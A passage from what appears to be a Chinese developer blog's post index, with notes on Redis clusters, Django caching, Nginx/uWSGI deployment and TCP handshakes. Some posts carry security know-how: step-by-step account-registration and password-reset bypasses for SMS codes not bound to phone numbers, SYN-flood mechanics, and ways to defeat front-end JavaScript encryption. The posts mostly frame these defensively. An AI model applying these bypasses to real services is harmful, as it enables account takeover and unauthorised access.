，默认情况会给我们平均分配，当然你可以指定，后续的增减节点也可以重新分配。 查看集群信息：192.168.134.124:7003&gt; cluster info(查看集群信息),cluster nodes(查看节点列表) 至此，集群搭建完毕，6个节点，3主，3从，只有主节点才拥有槽，并对外提供读写数据服务。注意至少有3个主节点才可以搭建集群，为每个主至少分配1个从，所以至少需要6个redis节点才可以形成集群。 2.3 槽 redis cluster 默认分配了 16384 个slot，所有的主redis服务器，大概均分所有的槽 存&#x2F;取值时 ，redis会根据key，计算一个介于 0 – 16383之间的数字，此数字即为当前数据的槽位置，通过槽位置，决定哪个redis主服务器来负责本次访问 所有的读写操作都会交给redis的主服务器，现在有3台redis的主服务器，来了数据请求之后，具体由哪一台redis的主服务器负责提供服务呢？ set name Tom name经过hash算法算出一个介于0-16383之间的数字 5798 set age 18 age经过hash算法算出0-16383 741 Redis 集群会把数据存在一个master节点，然后在这个master和其对应的slave之间进行数据同步。当读取数据时，也根据一致性哈希算法到对应的master节点获取数据。只有当一个master 挂掉之后，才会启动一个对应的slave节点，充当master。 需要注意的是：必须要3个或以上的主节点，否则在创建集群时会失败，并且当存活的主节点数小于总节点数的一半时，整个集群就无法提供服务了。 2.4 集群说明 集群搭建后： 性能的进一步提升，可以在单位时间内，吞吐更多的请求 数据的存储节点，具有高可用性(集群有好的容错机制) 集群容错： 所有槽可以被覆盖时，则集群正常运行 如果16384个槽，不能被所有主机完整覆盖了，则集群宕机 三、集群节点操作1、从节点操作1.1 添加从节点12345redis-cli --cluster add-node 192.168.134.124:7000 192.168.134.124:7001 --cluster-slave --cluster-master-id 4032891b648e76b2975e5bc701e9c8a52ad6f3dd# 注意：加新节点之前 要清楚新节点中数据# add-node: 后面的分别跟着新加入的slave和集群中任意一个节点# cluster-slave：表示加入的是slave节点# --cluster-master-id：表示slave对应的master的node ID 1.2 删除从节点12 #集群中已存在的节点ip:port #要删除的节点的idredis-cli --cluster del-node 192.168.134.124:7003 875e192f647ccf06ce6b1d92e15df31a2286dbbf 2、主节点操作2.1 添加主节点12redis-cli --cluster add-node 192.168.134.124:7000 192.168.134.124:7006 #新增加的主节点 #一个已存在的节点 将7006添加到7001所在集群中，成为一个主节点，但此时它不持有任何槽，需要重新分片 2.2 重新分片1redis-cli --cluster reshard 192.168.134.124:7000 分出去的槽，从之前拥有操作的所有主节点中获取。","categories":[{"name":"redis","slug":"redis","permalink":"http://example.com/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://example.com/tags/redis/"}]},{"title":"redis和python","slug":"Redis_03","date":"2020-11-20T01:41:29.000Z","updated":"2024-03-15T07:11:15.740Z","comments":true,"path":"2020/11/20/Redis_03/","permalink":"http://example.com/2020/11/20/Redis_03/","excerpt":"Redis数据库的学习笔记","text":"Redis数据库的学习笔记 Python-Redis一、安装模块在虚拟环境中安装以下几个模块： pip install redis #安装redis模块 pip install redis-py-cluster #支持python连接redis集群 pip install django-redis==4.8.0 #支持django 二、连接Redis1、连接12from redis import Redisred = Redis(host=&#x27;192.168.134.124&#x27;,port=8000) # 连接redis数据库 123456789red.set(&quot;name&quot;,&quot;Mr_lee&quot;)red.set(&quot;age&quot;,18)age = red.get(&quot;age&quot;)print(age)red.lpush(&quot;hobby&quot;,&quot;football&quot;,&quot;basketball&quot;)hobby = red.lrange(&quot;hobby&quot;,0,-1)print(hobby) 2、Json序列化存储 读取MySQL数据库中的数据，转存到Redis数据库中 1序列化过程：获取Model数据 -&gt; 序列化为json字符串 -&gt; set存储到redis数据库 123456789101112131415import jsonfrom redis import Redisfrom datetime import datetimered = Redis(host=&#x27;192.168.134.124&#x27;,port=8000) # 连接redis数据库def mydefault(u): if isinstance(u,User): return &#123;&quot;name&quot;:u.name,&#x27;age&#x27;:u.age,&#x27;salary&#x27;:u.salary,&#x27;birthday&#x27;:u.birthday.strftime(&#x27;%Y-%m-%d&#x27;)&#125;users = list(User.objects.all()) # 查询mysql数据库中的user-&gt;QuerySet，并转为listuser_dump = json.dumps(users,default=mydefault) # 将model数据 转为 json字符串print(user_dump)red.set(&#x27;userlist&#x27;,user_dump) # 将json字符串以key-value的形式存储到redis中 3、反序列化1反序列化过程：获取redis数据库中的数据get -&gt; json字符串 -&gt; 提取字符串中的数据（反序列化） -&gt; Model对象 123456def parsedefault(dic): # u为list中的一个个dict return User(name=dic[&#x27;name&#x27;],age=dic[&#x27;age&#x27;],salary=dic[&#x27;salary&#x27;],birthday=dic[&#x27;birthday&#x27;])res = red.get(&quot;userlist&quot;) # 返回bytes 需转为str b&quot;xxx&quot;.decode(&quot;utf-8&quot;) -&gt; strresults = json.loads(res.decode(&quot;utf-8&quot;),object_hook=parsedefault)print(results) 三、Python-Redis集群12345678910111213from rediscluster import RedisClustercluster_nodes = [ &#123;&#x27;host&#x27;: &#x27;192.168.134.124&#x27;, &#x27;port&#x27;: 7001&#125;, &#123;&#x27;host&#x27;: &#x27;192.168.134.124&#x27;, &#x27;port&#x27;: 7002&#125;, &#123;&#x27;host&#x27;: &#x27;192.168.134.124&#x27;, &#x27;port&#x27;: 7003&#125;, &#123;&#x27;host&#x27;: &#x27;192.168.134.124&#x27;, &#x27;port&#x27;: 7004&#125;, &#123;&#x27;host&#x27;: &#x27;192.168.134.124&#x27;, &#x27;port&#x27;: 7005&#125;, &#123;&#x27;host&#x27;: &#x27;192.168.134.124&#x27;, &#x27;port&#x27;: 7006&#125;,]cluster = StrictRedisCluster(startup_nodes=cluster_nodes)cluster.set(&#x27;name&#x27;,&#x27;Mr_lee&#x27;) # key 0-16383 四、Django-Redis缓存1、缓存的概念在实际Web开发中，经常需要在客户端和服务器端进行数据传输： 客户端发送请求，服务器端接收请求，返回数据 而在返回数据之前，我们要对数据库进行查询操作，找到正确的请求内容 如果要查找的数据量比较大，每次请求的耗时将会是一个非常可怕的事情。 这个时候，我们就需要对某些无需实时更新的内容进行缓存处理，把要返回的内容存放在缓存中，收到数据请求后直接把缓存中的数据返回，如果缓存不存在，则查询数据库，并且把内容添加进缓存中，以便下次请求使用。 简单来说：缓存就是把一些查询频繁且改动较少的数据，放入一个内存区域临时存储，进而在一定程度上改善查询的性能。 2、缓存流程初次查询，依然找到磁盘数据库，然后会将查询结果返回并纳入缓存； 之后的每次相同的查询都可以直接从缓存取数据，则可以达到 “较少与磁盘数据库通信次数” 的目的。 如果缓存失效，则再次回到数据库查询，并存入缓存。重复上述过程 数据存储在Mysql中，查询到数据后，返回给客户端，同时将数据存储入redis数据库中（redis就是内存数据库） 3、Redis缓存配置3.1 安装django-redispip install django-redis 3.2 设置缓存在Django项目的settings.py中添加如下设置： 123456789CACHES = &#123; &quot;default&quot;: &#123; &quot;BACKEND&quot;: &quot;django_redis.cache.RedisCache&quot;, #Redis缓存入口，其中使用DefaultClient操作缓存 &quot;LOCATION&quot;: &quot;redis://192.168.134.124:8000/3&quot;, #ip:port/db_index &quot;OPTIONS&quot;: &#123; &quot;CLIENT_CLASS&quot;: &quot;django_redis.client.DefaultClient&quot; #操作缓存的对象 &#125; &#125;&#125; 4、view缓存实际要缓存的应该是查询到的数据，但是数据最终会通过模板文件html来显示 view缓存是将整个的模板文件加入到缓存中 1234@cache_page(timeout=10,key_prefix=&quot;cacheRedis&quot;) # timeout 缓存时效(秒)def index(request): users = User.objects.all() return render(request,&#x27;redis_app/index.html&#x27;,&#123;&quot;users&quot;:users&#125;) 加在会渲染模板的视图函数上，会将整个模板的渲染结果存入缓存 5、template缓存在模板中使用缓存，可以充分考虑缓存的颗粒度，细分颗粒度，可以保存只缓存部分HTML片段，而不是整个模板文件。 12345678910111213141516171819&lt;!DOCTYPE html&gt;&#123;% load cache %&#125; # 加载cache&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &#123;% cache 100 cache_1 %&#125; # 要缓存的区域--开始 缓存时间100s &#123;% for u in users %&#125; &#123;&#123; u.name &#125;&#125; &#123;% endfor %&#125; &#123;% endcache %&#125; # 要缓存的区域--结束 &lt;/body&gt;&lt;/html&gt; 6、缓存删除当数据库的数据发生改动时，需要删除缓存 123456789101112from django.core.cache import cache---------------------------------------------------------------------keys = cache.keys(&quot;*abc*&quot;)#获取包含abc的所有keyfor key in keys: #遍历key cache.delete(key) #删除某个key-----------------------------------------------------------------------cache.delete_many(keys) #删除多个key--------------------------------------------------------------- cache.delete_pattern(&quot;*abc*&quot;) #删除包含abc的所有key--------------------------------------------------------------- cache.clear() #清空当前db的所有key 7、Session存储将session存入缓存，可以提高session数据的交互效率 12#django.contrib.sessions.backends.cached_db -- 缓存和数据库中并存SESSION_ENGINE=&#x27;django.contrib.sessions.backends.cache&#x27; #存于缓存","categories":[],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"}]},{"title":"redis面试题","slug":"redis面试题","date":"2020-11-20T01:41:29.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/11/20/redis面试题/","permalink":"http://example.com/2020/11/20/redis%E9%9D%A2%E8%AF%95%E9%A2%98/","excerpt":"redis面试题","text":"redis面试题 redis面试题 redis数据类型 12345678910111213141516171819202122232425262728293031# String字符串：格式: set key valuestring类型是二进制安全的。意思是redis的string可以包含任何数据。比如jpg图片或者序列化的对象 。string类型是Redis最基本的数据类型，一个键最大能存储512MB。# Hash（哈希）格式: hmset name key1 value1 key2 value2Redis hash 是一个键值(key=&gt;value)对集合。Redis hash是一个string类型的field和value的映射表，hash特别适合用于存储对象。# List（列表）Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）格式: lpush name value在 key 对应 list 的头部添加字符串元素格式: rpush name value在 key 对应 list 的尾部添加字符串元素格式: lrem name indexkey 对应 list 中删除 count 个和 value 相同的元素格式: llen name 返回 key 对应 list 的长度# Set（集合）格式: sadd name valuRedis的Set是string类型的无序集合。集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)。# zset(sorted set：有序集合)格式: zadd name score valueRedis zset 和 set 一样也是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。zset的成员是唯一的,但分数(score)却可以重复。 Redis持久化 1234567891011121314151617持久化就是把内存的数据写到磁盘中去，防止服务宕机了内存数据丢失。两种持久化方式:RDB（默认）快照 和AOF 日志# 比较1、aof文件比rdb更新频率高，优先使用aof还原数据。2、aof比rdb更安全也更大3、rdb性能比aof好4、如果两个都配了优先加载AOF## RDB：Redis DataBase功能核心函数rdbSave(生成RDB文件)和rdbLoad（从文件加载内存）两个函数## AOF: Append-only file每当执行服务器(定时)任务或者函数时flushAppendOnlyFile 函数都会被调用， 这个函数执行以下两个工作aof写入保存：WRITE：根据条件，将 aof_buf 中的缓存写入到 AOF 文件SAVE：根据条件，调用 fsync 或 fdatasync 函数，将 AOF 文件保存到磁盘中 redis通讯协议RESP 1234567# RESP 是redis客户端和服务端之前使用的一种通讯协议；# RESP 的特点：实现简单、快速解析、可读性好For Simple Strings the first byte of the reply is &quot;+&quot; 回复For Errors the first byte of the reply is &quot;-&quot; 错误For Integers the first byte of the reply is &quot;:&quot; 整数For Bulk Strings the first byte of the reply is &quot;$&quot; 字符串For Arrays the first byte of the reply is &quot;*&quot; 数组 Redis 有哪些架构模式？讲讲各自的特点 1234567891011121314151617181920212223242526272829303132333435363738394041424344# 单机版特点：简单问题：1、内存容量有限 2、处理能力有限 3、无法高可用。# 主从复制Redis 的复制（replication）功能允许用户根据一个 Redis 服务器来创建任意多个该服务器的复制品，其中被复制的服务器为主服务器（master），而通过复制创建出来的服务器复制品则为从服务器（slave）。 只要主从服务器之间的网络连接正常，主从服务器两者会具有相同的数据，主服务器就会一直将发生在自己身上的数据更新同步 给从服务器，从而一直保证主从服务器的数据相同。特点：1、master/slave 角色2、master/slave 数据相同3、降低 master 读压力在转交从库问题：无法保证高可用没有解决 master 写的压力# 哨兵Redis sentinel 是一个分布式系统中监控 redis 主从服务器，并在主服务器下线时自动进行故障转移。其中三个特性：监控（Monitoring）：Sentinel 会不断地检查你的主服务器和从服务器是否运作正常。提醒（Notification）： 当被监控的某个 Redis 服务器出现问题时， Sentinel 可以通过 API 向管理员或者其他应用程序发送通知。自动故障迁移（Automatic failover）： 当一个主服务器不能正常工作时， Sentinel 会开始一次自动故障迁移操作。特点：1、保证高可用2、监控各个节点3、自动故障迁移缺点：主从模式，切换需要时间丢数据没有解决 master 写的压力# 集群（proxy 型）：Twemproxy 是一个 Twitter 开源的一个 redis 和 memcache 快速/轻量级代理服务器； Twemproxy 是一个快速的单线程代理程序，支持 Memcached ASCII 协议和 redis 协议。特点：1、多种 hash 算法：MD5、CRC16、CRC32、CRC32a、hsieh、murmur、Jenkins 2、支持失败节点自动删除3、后端 Sharding 分片逻辑对业务透明，业务方的读写方式和操作单个 Redis 一致缺点：增加了新的 proxy，需要维护其高可用。failover 逻辑需要自己实现，其本身不能支持故障的自动转移可扩展性差，进行扩缩容都需要手动干预# 集群（直连型）：从redis 3.0之后版本支持redis-cluster集群，Redis-Cluster采用无中心结构，每个节点保存数据和整个集群状态,每个节点都和其他所有节点连接。特点：1、无中心架构（不存在哪个节点影响性能瓶颈），少了 proxy 层。2、数据按照 slot 存储分布在多个节点，节点间数据共享，可动态调整数据分布。3、可扩展性，可线性扩展到 1000 个节点，节点可动态添加或删除。4、高可用性，部分节点不可用时，集群仍可用。通过增加 Slave 做备份数据副本5、实现故障自动 failover，节点之间通过 gossip 协议交换状态信息，用投票机制完成 Slave到 Master 的角色提升。缺点：1、资源隔离性较差，容易出现相互影响的情况。2、数据通过异步复制,不保证数据的强一致性 Redis常用命令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Keys pattern*表示区配所有以bit开头的查看Exists key是否存在Set设置 key 对应的值为 string 类型的 value。setnx设置 key 对应的值为 string 类型的 value。如果 key 已经存在，返回 0，nx 是 not exist 的意思。删除某个key第一次返回1 删除了 第二次返回0Expire 设置过期时间（单位秒）TTL查看剩下多少时间返回负数则key失效，key不存在了Setex设置 key 对应的值为 string 类型的 value，并指定此键值对应的有效期。Mset一次设置多个 key 的值，成功返回 ok 表示所有的值都设置了，失败返回 0 表示没有任何值被设置。Getset设置 key 的值，并返回 key 的旧值。Mget一次获取多个 key 的值，如果对应 key 不存在，则对应返回 nil。Incr对 key 的值做加加操作,并返回新的值。注意 incr 一个不是 int 的 value 会返回错误，incr 一个不存在的 key，则设置 key 为 1incrby同 incr 类似，加指定值 ，key 不存在时候会设置 key，并认为原来的 value 是 0Decr对 key 的值做的是减减操作，decr 一个不存在 key，则设置 key 为-1Decrby同 decr，减指定值。Append给指定 key 的字符串值追加 value,返回新字符串值的长度。Strlen取指定 key 的 value 值的长度。persist xxx(取消过期时间)选择数据库（0-15库）Select 0 //选择数据库move age 1//把age 移动到1库Randomkey随机返回一个keyRename重命名Type 返回数据类型 什么是缓存穿透？如何避免？什么是缓存雪崩？何如避免？ 123456789101112131415# 缓存穿透一般的缓存系统，都是按照key去缓存查询，如果不存在对应的value，就应该去后端系统查找（比如DB）。一些恶意的请求会故意查询不存在的key,请求量很大，就会对后端系统造成很大的压力。这就叫做缓存穿透。# 如何避免？1：对查询结果为空的情况也进行缓存，缓存时间设置短一点，或者该key对应的数据insert了之后清理缓存。2：对一定不存在的key进行过滤。可以把所有的可能存在的key放到一个大的Bitmap中，查询时通过该bitmap过滤。# 缓存雪崩当缓存服务器重启或者大量缓存集中在某一个时间段失效，这样在失效的时候，会给后端系统带来很大压力。导致系统崩溃。# 如何避免？1：在缓存失效后，通过加锁或者队列来控制读数据库写缓存的线程数量。比如对某个key只允许一个线程查询数据和写缓存，其他线程等待。2：做二级缓存，A1为原始缓存，A2为拷贝缓存，A1失效时，可以访问A2，A1缓存失效时间设置为短期，A2设置为长期3：不同的key，设置不同的过期时间，让缓存失效的时间点尽量均匀。","categories":[],"tags":[{"name":"面试题","slug":"面试题","permalink":"http://example.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"}]},{"title":"使用pycharm导出虚拟环境依赖包","slug":"使用pycharm导出虚拟环境依赖包","date":"2020-11-09T01:20:57.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/11/09/使用pycharm导出虚拟环境依赖包/","permalink":"http://example.com/2020/11/09/%E4%BD%BF%E7%94%A8pycharm%E5%AF%BC%E5%87%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BE%9D%E8%B5%96%E5%8C%85/","excerpt":"","text":"导出 1pip freeze &gt; requirements.txt 安装 1pip install -r requirements.txt","categories":[],"tags":[{"name":"Pycharm","slug":"Pycharm","permalink":"http://example.com/tags/Pycharm/"}]},{"title":"短信验证码常见漏洞","slug":"短信验证码常见漏洞","date":"2020-11-09T00:59:33.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/11/09/短信验证码常见漏洞/","permalink":"http://example.com/2020/11/09/%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/","excerpt":"短信轰炸漏洞,验证码未与手机号绑定,验证码暴力破解漏洞,客户端验证绕过","text":"短信轰炸漏洞,验证码未与手机号绑定,验证码暴力破解漏洞,客户端验证绕过 一：短信轰炸漏洞 发送短信接口是最容易被盗刷的接口，不法分子利用接口的漏洞，任意的发送短信，给企业造成直接的经济损失。因此这个要特别注意，主要防御手段有四： （一）同一个手机号限制每日发送短信条数； （二）限制发送短信间隔，通常限制是 60秒，在客户端设置60秒倒计时没什么用，在服务端也要做； （三）给接口加签名验证增加破解接口的难度。 （四）限制ip日发送短信条数 二：验证码未与手机号绑定 验证码未与手机号绑定的话，就会发生这样的情况，A的验证码B可以用，这样是非常不安全的 （一）任意用户注册漏洞 可以使用任意手机号进行注册，操作步骤如下：1.在注册界面，输入自己的手机号；2.发送验证码，拿到验证码，然后退出登录界面；3.重新进入注册界面，输入任意人的手机号，输入刚才拿到的自己的验证码，注册成功。 （二）任意用户密码重置漏洞 可以任意修改任何账号的密码，操作步骤如下：1.在忘记密码界面，输入自己的手机号；2.发送验证码，拿到验证码，然后退出忘记密码界面；3.输入其他人的手机号，输入自己的验证码，验证成功，修改别人的密码成功。 解决之道，唯有在服务端校将验证码与手机号绑定。 三：验证码暴力破解漏洞 验证码一般由4位或6位数字组成，4位的话，最多尝试1万次就能破解验证码，所以应对验证次数进行限制，同时应该设置验证码的过期时间（5分钟或15分钟失效），防止暴力破解验证码。 四：客户端验证绕过 在客户端校验验证码是不安全的，必须在服务端进行验证，否则容易造成任意用户注册、任意修改密码、任意登陆等一系列问题。","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"HTTP","slug":"Http的了解","date":"2020-11-07T08:19:49.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/11/07/Http的了解/","permalink":"http://example.com/2020/11/07/Http%E7%9A%84%E4%BA%86%E8%A7%A3/","excerpt":"http工作原理,TCP 的三次握手客户端,四次挥手….","text":"http工作原理,TCP 的三次握手客户端,四次挥手…. http工作原理12345671.地址进行dns解析,将url解析出对应的内容2.封装http请求数据包3.封装成tcp包,建立tcp连接(tcp的三次握手)4.客户端发送请求5.服务器接收请求,发送响应6.客户端接收响应,进行页面渲染7.服务器关闭TCP连接(TCP的四次挥手) TCP 的三次握手客户端12341. 第一次握手:建立连接时,客户端发送syn包到服务器,并进入syn_sent状态,等待服务器确认;syn:同步序列编号2. 第二次握手: 服务器收到syn包,必须确认客户的syn(ack=j+1),同时自己发送一个syn包(seq=k),即syn+ack包每次是服务器进入syn_recv状态3. 第三次握手:客户端收到服务器的syn+ack包,向服务器发送确认包ack(ack=k+1),此包发送完毕,客户端和服务端进入连接成功状态 三次握手缺点123syn-flood攻击是最常见的DDoS攻击,也是最经典的拒绝服务攻击. 利用TCP协议实现的一个缺陷,通过像网络服务所在端口发送大量伪造源地址的攻击报文,就可能造成目标服务器中的半开连接队被沾满,从而阻止其他合法用户进行访问. 数据包特征: 源发送了大量的syn包,并缺少了三次握手的最后一步握手ack回复 1234567891011121314原理：攻击者首先伪造地址对 服务器发起SYN请求，服务器回应(SYN+ACK)包，而真实的IP会认为，我没有发送请求，不作回应。服务器没有收到回应，这样的话，服务器不知道(SYN+ACK)是否发送成功，默认情况下会重试5次（tcp_syn_retries)这样的话，对于服务器的内存，带宽都有很大的消耗。攻击者如果处于公网，可以伪造IP的话，对于服务器就很难根据IP来判断攻击者，给防护带来很大的困难。 解决办法: 1． 无效连接监视释放 这种方法不停的监视系统中半开连接和不活动连接，当达到一定阈值时拆除这些连接，释放系统资源。 2． 延缓TCB分配方法 SYN Flood关键是利用了，SYN数据报文一到，系统立即分配TCB资源，从而占用了系统资源，因此有俩种技术来解决这一问题 Syn Cache技术 这种技术在收到SYN时不急着去分配TCB，而是先回应一个ACK报文，并在一个专用的HASH表中（Cache）中保存这种半开连接，直到收到正确的ACK报文再去分配TCB Syn Cookie技术 Syn Cookie技术则完全不使用任何存储资源，它使用一种特殊的算法生成Sequence Number，这种算法考虑到了对方的IP、端口、己方IP、端口的固定信息，以及对方无法知道而己方比较固定的一些信息，如MSS、时间等，在收到对方 的ACK报文后，重新计算一遍，看其是否与对方回应报文中的（Sequence Number-1）相同，从而决定是否分配TCB资源。 3.使用SYN Proxy防火墙 原理：对试图穿越的SYN请求进行验证之后才放行 四次挥手1234第一步，当主机A的应用程序通知TCP数据已经发送完毕时，TCP向主机B发送一个带有FIN附加标记的报文段（FIN表示英文finish）第二步，主机B收到这个FIN报文段之后，并不立即用FIN报文段回复主机A，而是先向主机A发送一个确认序号ACK，同时通知自己相应的应用程序：对方要求关闭连接（先发送ACK的目的是为了防止在这段时间内，对方重传FIN报文段）第三步，主机B的应用程序告诉TCP：我要彻底的关闭连接，TCP向主机A送一个FIN报文段第四步，主机A收到这个FIN报文段后，向主机B发送一个ACK表示连接彻底释放 Http协议和Https协议的区别12345HTTP协议是使用明文数据传输的网络协议，明文传输会让用户存在一个非常大的安全隐患。端口80HTTPS协议可以理解为HTTP协议的安全升级版，就是在HTTP的基础上增加了数据加密。端口443HTTPS协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议要比HTTP协议安全。 HTTP协议特点1234- HTTP协议是超文本传输协议；- HTTP协议是一个应用层协议；- 无连接：每次请求都是独立的；- 无状态，表示客户端每次请求都不能记录请求状态，就是两条请求直接不可通信。","categories":[],"tags":[{"name":"Http","slug":"Http","permalink":"http://example.com/tags/Http/"}]},{"title":"js加密破解","slug":"js加密破解","date":"2020-11-01T02:29:08.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/11/01/js加密破解/","permalink":"http://example.com/2020/11/01/js%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/","excerpt":"1.前端加密 2.后端加密 3.加密算法","text":"1.前端加密 2.后端加密 3.加密算法 js加密破解分类1234561.前端加密 加密逻辑在前端2.后端加密 加密逻辑在后台,一般直接使用加密算法经行加密操作3.加密算法 Base64,Hex编码,MD5,AES,HASH,DES,RSA等 前端加密1234567891011121314151617181920破解思路 1.找到加密的逻辑代码 a.用python代码模拟加密过程 b.使用python第三方库执行js代码 直接执行js,生成对应的值 execjs 2.js加密分类 A.常规js代码加密 B.js压缩 把js代码中不必要的空格,换行等内容去除掉使得源码压缩为一行,降低代码的可读性,也可以防止断点调试,同时提高网站的加载速度,不方便后期维护 C.js混淆 对js代码进行混淆处理 可以使用变量替换,字符串阵列化,控制流平坦化,僵尸代码,调试保护等手段,使得源码变得难以阅读和分析,但不会影响代码的原有功能 D.js代码加密 将js逻辑使用c/c++等语言编写,通过js调用执行,从而达到二进制的防护作用 3.找不到js加密逻辑 使用无头浏览器 selenium 速度慢 pyppeteer selenium无头浏览器12341. 是一个自动化测试的工具 可以使用代码操作,类似于按键精灵2. 采集效率极低,消耗资源大,是一个浏览器内核,基本就相当于浏览器,可以获取浏览器上能获取到的数据.3. 需要通过驱动来操作浏览器","categories":[],"tags":[{"name":"Js加密破解","slug":"Js加密破解","permalink":"http://example.com/tags/Js%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/"}]},{"title":"Nginx服务器","slug":"Nginx服务器","date":"2020-10-29T06:18:30.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/10/29/Nginx服务器/","permalink":"http://example.com/2020/10/29/Nginx%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"Nginx服务器,nginx与uWSGI,集群和负载均衡策略,uWSGI服务器","text":"Nginx服务器,nginx与uWSGI,集群和负载均衡策略,uWSGI服务器 Nginx服务器一、Nginx概述1、简介Nginx是一款轻量级的web服务器&#x2F;反向代理服务器,占内存小,并发能力强. 作用123静态http服务器(处理静态资源-动静分离):首先,Nginx是http服务器,可以上传静态资源(图片,css,js文件)通过http协议展示给客户端.将静态资源交给nginx服务器 Nginx提供动静分离是指动态的请求和静态的请求分离开,合适的服务器处理合适的请求,使整个服务系统的性能,效率更高 uWSGI更适合做动态内容的执行,nginx更适合做静态内容的处理,客户端请求直接访问nginx服务器,留下静态部分处理,动态部分转发给uWSGI服务器,实现”动静分离” 反向代理服务器反向代理是指代理服务器nginx来接受internet上的请求,然后将请求转发给内部网络上的其他服务器uWSGI,并将uWSGI服务器上的得到的结果返回给Internet上请求的客户端,此时代理服务器对外表现为反向代理服务器. 代理均衡多在高并发情况下需要使用,原理时将数据流量分摊成多个服务器执行,减轻每台服务器的压力,多服务器(集群)共同完成工作任务,从而提高数据的吞吐量. 2、安装步骤 将tar包发送的linux 解压 tar -zxvf nginx-1.11.1.tar.gz 安装依赖 yum install gcc zlib-devel pcre-devel cd到解压目录：./configure #配置检测 cd到解压目录：make &amp;&amp; make install #编译并安装 安装完成，安装路径为/usr/local/nginx ,日志路径为 /usr/local/nginx/logs , 可执行文件路径为 /usr/local/nginx/sbin ,配置文件路径为 /usr/local/nginx/conf 欢迎页面路径为 /usr/local/nginx/html ln -s /usr/local/nginx/sbin/nginx /usr/bin/nginx 制作连接，便于执行nginx指令 nginx #启动nginx -s stop #关闭nginx -s reload #重启 http://ip:80即可访问nginx欢迎页面 二、nginx与uWSGInginx配置–到配置路径中的nginx.conf /usr/local/nginx/conf/nginx.conf 1234567891011121314151617181920upstream ems&#123; server 192.168.157.141:9001; # uWSGI&#x27;s socket = #server 192.168.157.142:9001; #192.168.x.x:9001 #可以在添加其他的uWSGI的服务器&#125;server &#123; listen 80; server_name 192.168.157.142; # nginx服务器的ip charset utf-8; location / &#123; uwsgi_pass ems; #和上面的upstream转接 include /usr/local/nginx/conf/uwsgi_params; # the uwsgi_params file you installed &#125; location /static &#123; #http://ip:80/static/a/b/c/d.png ==&gt; /usr/local/static/a/b/c/d.png alias /usr/local/static; # your Django project&#x27;s static files - amend as required &#125; ...｝ 配置好后，重启nginx即可，可以使用Nginx服务器来访问项目 注意关闭防火墙！！ 两台虚拟主机，一个运行nginx，其中保存project的静态资源；一个运行uwsgi，其中保存并部署project。 三、集群和负载均衡策略搭建uWSGI集群，只需要多做几份uWSGI的配置文件，文件中设置不同的ip:port，指向相同的project，然后启动多个uWSGI即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243*默认:轮询 upstream django &#123; server 192.168.0.103:8989; server 192.168.0.104:8989; &#125;*iphash:基于ip的负载均衡. upstream django &#123; ip_hash; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125;*权重轮询: upstream django &#123; server 192.168.0.103:8989 weight=1; server 192.168.0.104:8990 weight=2; &#125;*最小连接数： upstream django &#123; least_conn; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125;*默认:轮询 upstream django &#123; server 192.168.0.103:8989; server 192.168.0.104:8989; &#125;*iphash:基于ip的负载均衡. upstream django &#123; ip_hash; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125;*权重轮询: upstream django &#123; server 192.168.0.103:8989 weight=1; server 192.168.0.104:8990 weight=2; &#125;*最小连接数： upstream django &#123; least_conn; server 192.168.0.103:8989; server 192.168.0.104:8990; &#125; 至此，一个uWSGI集群搭建完成，nginx作为反向代理服务器和web服务器接收请求，然后处理静态的部分，动态部分按照负载均衡策略转发给某一个uWSGI服务器。 四、uWSGI服务器1、WSGI协议 使用Django或Flask框架编写的Web应用程序，在python manage.py runserver 时都启动的是框架内置的服务器来运行Web应用程序，而内置的服务器遵循了WSGI协议（WSGI Server）。 WSGI：全称是Web Server Gateway Interface，WSGI不是服务器，python模块，框架，API或者任何软件，只是一种规范，描述web server如何与web application通信的规范。 WSGI server负责从客户端接收请求，将request转发给application，将application返回的response返回给客户端； WSGI application接收由server转发的request，处理请求，并将处理结果返回给server。 要实现WSGI协议，必须同时实现web server和web application，当前运行在WSGI协议之上的web框架有Bottle, Flask, Django。 总结：WSGI是Web 服务器(uWSGI)与 Web 应用程序或应用框架(Django)之间的一种低级别的接口。 2、uWSGI服务器安装WSGI协议下web服务器很多：django内置，uWSGI，gunicorn。 2.1 服务器安装 将uWSGI的tar包发送linux 解压tar：tar -zxvf uwsgi-2.0.17.tar.gz cd到解压目录下，编译：make 为了可以更方便的执行 uwsgi 启动uWSGI服务器，定制链接： ln -s /usr/local/uwsgi-2.0.17/uwsgi /usr/bin/uwsgi 则可以在任意目录下执行 uwsgi 去启动uWSGI服务器 测试使用python的wsgi服务器-uWSGI 在任意的一个目录中定义一个python脚本：hello.py 123def application(env, start_response): start_response(&#x27;200 OK&#x27;, 